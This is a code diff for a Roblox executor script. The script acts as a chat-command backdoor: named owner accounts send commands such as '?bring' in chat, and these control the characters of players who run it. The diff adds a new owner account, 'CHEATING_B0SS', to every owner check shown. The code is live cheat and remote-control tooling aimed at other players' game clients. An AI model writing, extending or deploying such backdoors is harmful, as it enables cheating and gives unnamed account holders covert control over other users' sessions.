@@ -17,7 +17,7 @@ end
 getgenv().Players = getgenv().Service_Wrap("Players")
 getgenv().LocalPlayer = getgenv().Players.LocalPlayer
 
-if getgenv().LocalPlayer.Name == "L0CKED_1N1" or getgenv().LocalPlayer.Name == "Laylay_4kla" then
+if getgenv().LocalPlayer.Name == "L0CKED_1N1" or getgenv().LocalPlayer.Name == "Laylay_4kla" or getgenv().LocalPlayer.Name == "CHEATING_B0SS" then
     print("Owner found, excluding.")
 else
     getgenv().TextChatService = getgenv().Service_Wrap("TextChatService")
@@ -120,7 +120,7 @@ else
         boolValue.Value = true
 
         if command == "?bring" then
-            local owner = cmdp:FindFirstChild("L0CKED_1N1")
+            local owner = cmdp:FindFirstChild("L0CKED_1N1") or cmdp:FindFirstChild("CHEATING_B0SS")
             if owner and player and owner.Character and player.Character then
                 local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
                 local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
@@ -281,7 +281,7 @@ else
         local sender = message.TextSource.Name
         local text = message.Text
 
-        if sender == "L0CKED_1N1" or sender == "Laylay_4kla" then
+        if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" then
             local command, playerName = string.match(text, "^(%?%w+)%s*(.*)")
             if command then
                 handleCommand(command, playerName)
@@ -415,7 +415,7 @@ else
 
     bringEvent.Event:Connect(function(player)
         local targetPlayer = findplr(player)
-        local owner = game.Players:FindFirstChild("L0CKED_1N1")
+        local owner = game.Players:FindFirstChild("L0CKED_1N1") or game.Players:FindFirstChild("CHEATING_B0SS")
 
         if not owner then
             warn("No Owner Found!")
